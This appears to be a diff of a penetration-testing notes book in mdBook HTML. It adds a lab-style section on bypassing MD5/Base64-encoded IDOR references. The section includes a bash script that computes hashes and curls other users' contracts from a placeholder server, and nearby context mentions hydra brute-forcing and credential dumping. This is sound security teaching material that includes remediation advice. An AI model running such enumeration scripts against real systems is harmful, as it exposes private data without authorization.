@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-98784f48.js";
+            window.path_to_searchindex_js = "searchindex-1df47fb7.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-829beffb.js"></script>
+        <script src="toc-fac9f2dd.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -28163,6 +28163,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#intro-to-idor">Intro to IDOR — what it is, why common, impact (disclosure, modification, privilege escalation), attack pattern</a></li>
 <li><a href="#identifying-idors">Identifying IDORs — URL params, AJAX calls, encoded/hashed references, comparing user roles</a></li>
 <li><a href="#idor--mass-enumeration">IDOR mass enumeration — insecure parameters, static file IDOR, parameter-based IDOR, bulk download scripting</a></li>
+<li><a href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References — MD5/Base64 schemes, function disclosure, reproducing hashes, mass enumeration script</a></li>
 </ul>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
 <p>Web attacks are the most common class of attacks against businesses, targeting external-facing applications, internal web apps, and API endpoints alike. This section covers three attack types found across many web applications. <strong>HTTP Verb Tampering</strong> exploits servers that accept unexpected HTTP methods, allowing attackers to bypass authorization mechanisms and security controls by sending requests with non-standard verbs. <strong>Insecure Direct Object References (IDOR)</strong> exploit weak or missing back-end access controls: when applications use predictable identifiers (sequential IDs, user numbers) to reference resources, an attacker can guess or calculate valid IDs to access other users’ data. <strong>XML External Entity (XXE) Injection</strong> targets applications using outdated XML parsers to process user-supplied XML — malicious payloads can read local files (configs, source code, credentials), enable whitebox testing, steal server credentials, and potentially achieve remote code execution.</p>
@@ -28172,6 +28173,7 @@ $result = $conn-&gt;query($query);
 <p><strong>IDOR</strong> vulnerabilities arise when a web application exposes direct references to internal objects (file IDs, database records, API paths) <strong>without back-end access control</strong> validating that the requesting user is authorized. The reference itself is not the flaw — the missing authorization check is. Impact ranges from <strong>information disclosure</strong> (reading other users’ files/PII) to <strong>data modification/account takeover</strong> (write-capable references) to <strong>privilege escalation</strong> (calling admin-only API endpoints that the back-end fails to restrict to admin roles). IDOR is pervasive because access control is inherently hard to build, hard to automate testing for, and frequently skipped by developers who rely on front-end logic alone.</p>
 <p><strong>Identifying IDORs</strong> starts with spotting direct object references in URL parameters (<code>?uid=1</code>), API paths, cookies, or headers, then incrementing/fuzzing values to check for unauthorized access. Front-end JavaScript AJAX calls may reveal hidden endpoints and parameters (including admin functions disabled client-side but present in source). <strong>Encoded</strong> references (Base64) can be decoded, modified, and re-encoded; <strong>hashed</strong> references can often be reproduced by finding the algorithm in front-end source (e.g., <code>CryptoJS.MD5(filename)</code>) or identifying the hash type. Registering <strong>multiple accounts</strong> and comparing their HTTP requests reveals how identifiers are calculated and whether the back-end validates the caller’s session against the requested resource.</p>
 <p><strong>Mass enumeration</strong> automates IDOR exploitation at scale. <strong>Static file IDORs</strong> embed the user ID in predictable filenames (<code>Invoice_1_09_2021.pdf</code>); <strong>parameter-based IDORs</strong> pass the UID directly in a query string (<code>?uid=1</code>) — always check linked file URLs and page source since the UI may look identical across different UIDs. Extract document links with <code>curl</code> + regex (<code>grep -oP "\/documents.*?.pdf"</code>), then loop over UID ranges with a bash script using <code>wget</code>, or use Burp Intruder / ZAP Fuzzer for the same result.</p>
+<p><strong>Bypassing encoded references</strong> exploits the common mistake of performing hashing or encoding client-side. When a web application obscures object references using a scheme like <code>MD5(Base64(uid))</code>, the algorithm is visible to anyone who reads the front-end JavaScript source. Reproducing the scheme on the command line (<code>echo -n 1 | base64 -w 0 | md5sum</code>) confirms the algorithm, after which all object references become calculable and the protection is equivalent to none. A bash loop generates hashes for every target UID and <code>curl -sOJ</code> downloads the associated file in a single script. True security requires the hash to be computed server-side with a secret salt <strong>and</strong> a back-end authorization check — encoding or hashing alone is not access control.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--bypassing-basic-authentication"><a class="header" href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — Bypassing Basic Authentication</a></h1>
 <p>Exploiting insecure server configuration verb tampering is straightforward: try alternate HTTP methods and observe how the server handles them. Automated scanners catch this type reliably (auth bypass is obvious once it works), but miss the insecure-coding variant, which requires active testing.</p>
@@ -28530,6 +28532,65 @@ done
 </code></pre>
 <p>Adjust the UID range based on the target. Alternatives: Burp Intruder (payload positions on the UID parameter) or ZAP Fuzzer for the same effect without scripting.</p>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="idor--bypassing-encoded-references"><a class="header" href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References</a></h1>
+<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
+<p>Some web applications hash or encode object references (e.g., MD5, Base64) instead of exposing sequential integers. This makes enumeration harder but <strong>does not eliminate the IDOR</strong> if there is no back-end access control — an attacker who can reproduce the encoding scheme can still enumerate all objects.</p>
+<h2 id="recognizing-the-pattern"><a class="header" href="#recognizing-the-pattern">Recognizing the pattern</a></h2>
+<p>A POST parameter like:</p>
+<pre><code>contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+</code></pre>
+<p>looks like a 32-character MD5 hash. Naively testing <code>md5(uid)</code> may not match if a transformation is applied first.</p>
+<h2 id="function-disclosure--finding-the-algorithm-in-front-end-source"><a class="header" href="#function-disclosure--finding-the-algorithm-in-front-end-source">Function disclosure — finding the algorithm in front-end source</a></h2>
+<p>Modern JavaScript frameworks (Angular, React, Vue.js) often perform hashing client-side. Inspect the page source for the JavaScript that constructs the parameter:</p>
+<pre><code class="language-javascript">function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, "POST", "_self");
+}
+</code></pre>
+<p>This reveals the algorithm: <strong>Base64-encode the UID, then MD5-hash the result</strong>.</p>
+<h2 id="verifying-the-algorithm"><a class="header" href="#verifying-the-algorithm">Verifying the algorithm</a></h2>
+<p>Reproduce the hash on the command line, matching the front-end exactly:</p>
+<pre><code class="language-bash"># -n suppresses the trailing newline; -w 0 prevents base64 line-wrapping
+echo -n 1 | base64 -w 0 | md5sum
+# cdd96d3cc73d1dbdaffa03cc6cd7339b
+</code></pre>
+<p>If the output matches the observed parameter value, the algorithm is confirmed and all object references can now be calculated.</p>
+<h2 id="mass-enumeration-via-script"><a class="header" href="#mass-enumeration-via-script">Mass enumeration via script</a></h2>
+<p>Generate hashes and download files for a range of UIDs:</p>
+<pre><code class="language-bash">#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+</code></pre>
+<ul>
+<li><code>tr -d ' -'</code> strips the trailing space and dash added by <code>md5sum</code></li>
+<li><code>-sOJ</code> saves the file using the server-supplied filename (<code>Content-Disposition</code>)</li>
+</ul>
+<p>Running the script downloads contracts for all enumerated employees:</p>
+<pre><code>contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
+contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
+...
+</code></pre>
+<h2 id="key-takeaways-7"><a class="header" href="#key-takeaways-7">Key takeaways</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Factor</th><th>Detail</th></tr>
+</thead>
+<tbody>
+<tr><td>Encoding/hashing</td><td>Obscures references but is <strong>not</strong> access control</td></tr>
+<tr><td>Front-end hashing</td><td>Algorithm is visible to any user who reads page source</td></tr>
+<tr><td>Secure alternative</td><td>Hash server-side with a secret salt <strong>and</strong> enforce back-end authorization</td></tr>
+<tr><td>Tools for blind hashing</td><td>Burp Comparer, Burp Intruder, ZAP Fuzzer — fuzz values and compare hashes</td></tr>
+</tbody>
+</table>
+</div>
+<p>A truly <strong>Secure Direct Object Reference</strong> requires both an unpredictable reference <strong>and</strong> a server-side check that the requesting user is authorized to access it. Either alone is insufficient.</p>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="introduction-to-web-attacks"><a class="header" href="#introduction-to-web-attacks">Introduction to Web Attacks</a></h1>
 <h2 id="why-web-attacks-matter"><a class="header" href="#why-web-attacks-matter">Why web attacks matter</a></h2>
 <p>Web applications are the most common attack surface for businesses today. Compromising an external-facing web application can pivot to an internal network, leading to stolen assets or disrupted services. Even organizations with no external web apps typically have internal web apps or external API endpoints, both vulnerable to the same attack classes.</p>
@@ -28707,7 +28768,7 @@ NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  [-] Error while dumping NTDS
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-windows-credential-manager"><a class="header" href="#attacking-windows-credential-manager">Attacking Windows Credential Manager</a></h1>
-<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
+<h2 id="overview-16"><a class="header" href="#overview-16">Overview</a></h2>
 <p>Windows Credential Manager is a built-in feature (since Server 2008 R2 / Windows 7) that allows users and applications to securely store credentials for other systems and websites. Credentials are stored in encrypted folders protected by DPAPI.</p>
 <h2 id="credential-storage-locations-1"><a class="header" href="#credential-storage-locations-1">Credential Storage Locations</a></h2>
 <div class="table-wrapper">
@@ -30759,7 +30820,7 @@ if (isset($_GET['c'])) {
 </li>
 <li><a href="#network-policies">Network Policies</a>
 <ul>
-<li><a href="#overview-16">Overview</a></li>
+<li><a href="#overview-17">Overview</a></li>
 <li><a href="#key-concepts-3">Key Concepts</a></li>
 <li><a href="#common-fields-in-a-network-policy">Common Fields in a Network Policy</a></li>
 <li><a href="#example-network-policies">Example Network Policies</a>
@@ -31465,7 +31526,7 @@ mouse support. This can be useful.</p>
 </li>
 </ul>
 <h2 id="network-policies"><a class="header" href="#network-policies">Network Policies</a></h2>
-<h3 id="overview-16"><a class="header" href="#overview-16">Overview</a></h3>
+<h3 id="overview-17"><a class="header" href="#overview-17">Overview</a></h3>
 <ul>
 <li>
 <p>Kubernetes Network Policies allow you to control the flow of traffic to and from pods. They define rules that specify:</p>
@@ -35252,7 +35313,7 @@ Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                           
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="basic-http-authentication-2"><a class="header" href="#basic-http-authentication-2">Basic HTTP Authentication</a></h1>
 <p>Basic HTTP Authentication, or simply Basic Auth, is a rudimentary yet common method for securing resources on the web. Though easy to implement, its inherent security vulnerabilities make it a frequent target for brute-force attacks.</p>
-<h2 id="overview-17"><a class="header" href="#overview-17">Overview</a></h2>
+<h2 id="overview-18"><a class="header" href="#overview-18">Overview</a></h2>
 <p>Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a <strong>401 Unauthorized</strong> status and a <strong>WWW-Authenticate</strong> header prompting the user’s browser to present a login dialog.</p>
 <h2 id="authentication-flow-1"><a class="header" href="#authentication-flow-1">Authentication Flow</a></h2>
 <ol>
@@ -35443,7 +35504,7 @@ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-persistent-connection"><a class="header" href="#http-persistent-connection">HTTP Persistent Connection</a></h1>
 <p>HTTP persistent connection, also known as HTTP keep-alive or connection reuse, involves using a single TCP connection for multiple HTTP requests/responses instead of opening new connections for each pair. This method is employed in both HTTP/1.0 (unofficially through an extension) and HTTP/1.1 (officially, with all connections considered persistent unless specified otherwise). It offers several advantages, including reduced latency, CPU usage, network congestion, and enhanced HTTP pipelining. However, it can lead to resource allocation issues on the server if connections are not properly closed. Modern web browsers and Python’s requests library support HTTP persistent connections.</p>
-<h2 id="overview-18"><a class="header" href="#overview-18">Overview</a></h2>
+<h2 id="overview-19"><a class="header" href="#overview-19">Overview</a></h2>
 <ul>
 <li><strong>Definition</strong>: A method to use a single TCP connection for multiple HTTP requests/responses.</li>
 <li><strong>Also Known As</strong>: HTTP keep-alive, connection reuse.</li>
@@ -36358,7 +36419,7 @@ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="smtp-simple-mail-transfer-protocol"><a class="header" href="#smtp-simple-mail-transfer-protocol">SMTP (Simple Mail Transfer Protocol)</a></h1>
-<h2 id="overview-19"><a class="header" href="#overview-19">Overview</a></h2>
+<h2 id="overview-20"><a class="header" href="#overview-20">Overview</a></h2>
 <p>SMTP (Simple Mail Transfer Protocol) is a protocol used for sending and receiving email messages over the internet. It is a text-based protocol that operates on the application layer of the OSI model and is primarily used for sending emails from a client to a mail server or between mail servers.</p>
 <p>SMTP is often combined with IMAP or POP3 protocols, which are used for retrieving and storing emails on a mail server.</p>
 <h2 id="smtp-definitions"><a class="header" href="#smtp-definitions">SMTP Definitions</a></h2>
@@ -42453,7 +42514,7 @@ C:\Windows\system32&gt; whoami
 nt authority\system
 </code></pre>
 <hr>
-<h2 id="key-takeaways-7"><a class="header" href="#key-takeaways-7">Key Takeaways</a></h2>
+<h2 id="key-takeaways-8"><a class="header" href="#key-takeaways-8">Key Takeaways</a></h2>
 <ol>
 <li><strong>Module Structure</strong>: Understanding the <code>&lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</code> format helps identify appropriate modules</li>
 <li><strong>Search Functionality</strong>: Powerful search with multiple keywords and filters helps find the right module quickly</li>
